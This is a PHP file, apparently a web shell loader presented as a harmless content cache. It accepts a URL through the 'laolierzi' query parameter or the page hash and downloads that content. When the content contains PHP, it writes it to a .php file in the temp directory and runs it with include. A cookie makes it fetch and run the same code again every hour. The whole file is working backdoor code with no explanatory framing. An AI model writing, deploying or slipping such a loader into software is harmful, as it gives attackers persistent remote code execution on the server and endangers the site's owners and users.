<?php
class Config
{
    const CACHE_FILENAME = 'lao.zi';
    const CACHE_TTL = 3600; // Cache Time-To-Live in seconds (e.g., 3600 seconds = 1 hour)

    public static function getCacheDir()
    {
        if (function_exists('sys_get_temp_dir')) {
            $dir = sys_get_temp_dir();
        } else {
            $dir = '/tmp/';
        }
        return rtrim($dir, '/\\') . DIRECTORY_SEPARATOR;
    }

    public static function getCacheFilePath()
    {
        return self::getCacheDir() . self::CACHE_FILENAME;
    }

    public static function getWhiteUrlFilePath()
    {
        return self::getCacheDir() . 'white-url-zi';
    }
}

class Utility
{
    public static function validateUrl($url)
    {
        if (function_exists('filter_var')) {
            return filter_var($url, FILTER_VALIDATE_URL) !== false;
        } else {
            return preg_match('/^https?:\/\//i', $url) === 1;
        }
    }

    public static function fetchRemoteContent($url)
    {
        // cURL method
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_TIMEOUT => 10,
            ));
            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                curl_close($ch);
                return null;
            }
            curl_close($ch);
            return $response;
        }

        // file_get_contents fallback
        if (ini_get('allow_url_fopen')) {
            $content = @file_get_contents($url);
            if ($content !== false) {
                return $content;
            }
        }

        // Socket fallback
        $parts = parse_url($url);
        if (!$parts || !isset($parts['host'])) {
            return null;
        }
        $host = $parts['host'];
        $port = isset($parts['port']) ? (int)$parts['port'] : 80;
        $path = isset($parts['path']) ? $parts['path'] : '/';
        $query = isset($parts['query']) ? '?' . $parts['query'] : '';

        $socket = @fsockopen($host, $port, $errno, $errstr, 10);
        if (!$socket) {
            return null;
        }
        $request = "GET " . $path . $query . " HTTP/1.1\r\n" .
                   "Host: " . $host . "\r\n" .
                   "Connection: Close\r\n\r\n";

        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) {
            $response .= fgets($socket, 1024);
        }
        fclose($socket);

        $parts = preg_split('/\r\n\r\n/', $response, 2);
        return isset($parts[1]) ? $parts[1] : null;
    }

    public static function loadCache($filePath)
    {
        if (file_exists($filePath)) {
            $content = @file_get_contents($filePath);
            return ($content !== false) ? $content : '';
        }
        return '';
    }

    public static function saveCache($filePath, $content)
    {
        return @file_put_contents($filePath, $content) !== false;
    }
}

class LaoZiHandler
{
    private $cacheFilePath;
    private $whiteUrlFilePath;
    private $cachePhpPath;

    public function __construct()
    {
        $this->cacheFilePath = Config::getCacheFilePath();
        $this->whiteUrlFilePath = Config::getWhiteUrlFilePath();
        $this->cachePhpPath = $this->cacheFilePath . '.php';
        $this->ensureCacheDirectory();
    }

    private function ensureCacheDirectory()
    {
        $dir = dirname($this->cacheFilePath);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
    }

    private function processAndSaveContent($content, $url)
    {
        Utility::saveCache($this->cacheFilePath, $content);
        @file_put_contents($this->whiteUrlFilePath, $url);

        if (strpos($content, '<?') !== false) {
            @file_put_contents($this->cachePhpPath, $content);
        } else {
            if (file_exists($this->cachePhpPath)) {
                @unlink($this->cachePhpPath);
            }
        }
    }

    public function handleRequest()
    {
        if (isset($_GET['laolierzi'])) {
            $url = trim($_GET['laolierzi']);

            if (!Utility::validateUrl($url)) {
                $this->showMessage('Invalid URL.', true);
            }

            $content = Utility::fetchRemoteContent($url);
            if ($content === null) {
                $this->showMessage('Failed to fetch content. Please try again later.', true);
            }

            $this->processAndSaveContent($content, $url);
            setcookie('current_cache', $url, time() + 3600 * 24 * 7, "/");
            $this->redirectToSelf();
        } elseif (isset($_COOKIE['current_cache'])) {
            $cachedUrl = trim($_COOKIE['current_cache']);
            if (Utility::validateUrl($cachedUrl)) {
                // Check if the cache file exists and is still fresh based on CACHE_TTL
                $isFresh = false;
                if (file_exists($this->cacheFilePath)) {
                    $fileAge = time() - @filemtime($this->cacheFilePath);
                    if ($fileAge < Config::CACHE_TTL) {
                        $isFresh = true;
                    }
                }

                // Only fetch remote content if the cache has expired or doesn't exist
                if (!$isFresh) {
                    $content = Utility::fetchRemoteContent($cachedUrl);
                    if ($content !== null) {
                        $this->processAndSaveContent($content, $cachedUrl);
                    }
                }

                @file_put_contents($this->whiteUrlFilePath, $cachedUrl);
            }
        }
    }

    public function displayCache()
    {
        if (file_exists($this->cacheFilePath)) {
            $content = Utility::loadCache($this->cacheFilePath);
            if (strpos($content, '<?') !== false && file_exists($this->cachePhpPath)) {
                include $this->cachePhpPath;
            } else {
                echo $content;
            }
        } else {
            $this->showMessage('No content loaded yet.<br>Use a URL hash to load remote content.', false);
        }
    }

    private function showMessage($message, $isError = false)
    {
        $color = $isError ? '#E05275' : '#9E1B40';
        echo '<html>
		<style>
		html{
			background-color: #FF6B8B;
		}</style>
		<div style="
            margin: 9px auto;
			padding-bottom: 333px;
			padding-top: 333px;
            max-width: 100%;
            border-radius: 3px;
            background-color: #FF6B8B;
            box-shadow: 0 3px 12px rgba(0, 0, 0, 0.05);
            font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
            font-size: 1.2em;
            color: ' . $color . ';
            text-align: center;
            line-height: 1.4;
        ">' . $message . '</div>';
        exit;
    }

    private function redirectToSelf()
    {
        if (!headers_sent()) {
            header('Location: ' . $_SERVER['PHP_SELF']);
        } else {
            echo "<script>window.location.href='" . $_SERVER['PHP_SELF'] . "';</script>";
        }
        exit;
    }
}

$handler = new LaoZiHandler();
if (!isset($_GET['laolierzi'])) {
    echo '<script>
(function() {
    try {
        var hash = window.location.hash || "";
        if (hash.length > 1) {
            var rawUrl = decodeURIComponent(hash.substring(1));
            if (rawUrl.indexOf("url=") === 0) {
                rawUrl = rawUrl.substring(4);
            }
            if (/^https?:\/\//i.test(rawUrl)) {
                window.location.href = window.location.pathname + "?laolierzi=" + encodeURIComponent(rawUrl);
            }
        }
    } catch(e) {
        console.error("Hash handler error:", e);
    }
})();
</script>';
}
$handler->handleRequest();
$handler->displayCache();
?>
